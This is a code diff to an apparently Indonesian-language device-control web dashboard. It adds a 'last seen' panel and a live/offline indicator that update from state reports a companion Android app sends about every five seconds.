@@ -99,6 +99,15 @@
             </div>
           </div>
 
+          <!-- Monitor realtime (last seen) -->
+          <div style="border:1px solid #eee;border-radius:8px;padding:12px;margin-top:12px">
+            <div class="row" style="justify-content:space-between">
+              <b>📡 Monitor Realtime</b>
+              <span><span id="liveDot" class="dot off"></span><span id="liveText">belum ada data</span></span>
+            </div>
+            <div class="muted" style="margin-top:6px">Terakhir terlihat: <b id="lastSeen">-</b></div>
+          </div>
+
           <!-- Blokir aplikasi -->
           <div style="border:1px solid #eee;border-radius:8px;padding:12px">
             <div class="row" style="justify-content:space-between">
@@ -180,6 +189,7 @@
       $('devPkg').textContent = d.info.appPackage;
       $('devCode').textContent = d.code;
       $('devSession').textContent = d.sessionId;
+      updateLastSeen(d);
 
       // kunci layar: indikator ON/OFF + teks password
       const lockOn = !!d.state.lockEnabled;
@@ -211,6 +221,26 @@
       });
       $('emptyBlock').style.display = (d.state.blockedPackages || []).length ? 'none' : 'block';
     }
+
+    // ---------- monitor realtime (event "state" dari apk tiap ~5 detik) ----------
+    function updateLastSeen(d) {
+      const el = $('lastSeen');
+      if (!el) return;
+      if (!d.lastSeen) { el.textContent = '-'; return; }
+      el.textContent = new Date(d.lastSeen).toLocaleTimeString();
+      tickLive();
+    }
+    function tickLive() {
+      const d = currentDevice;
+      const dot = $('liveDot'), txt = $('liveText');
+      if (!d || !dot || !txt) return;
+      if (d.lastSeen && (Date.now() - d.lastSeen) < 12000 && d.online) {
+        dot.className = 'dot on'; txt.textContent = 'LIVE (apk kirim state tiap 5 detik)';
+      } else {
+        dot.className = 'dot off'; txt.textContent = 'tidak ada data baru';
+      }
+    }
+    setInterval(tickLive, 1000);
 
     // ---------- aksi control ----------
     $('btnSetPw').onclick = () => {
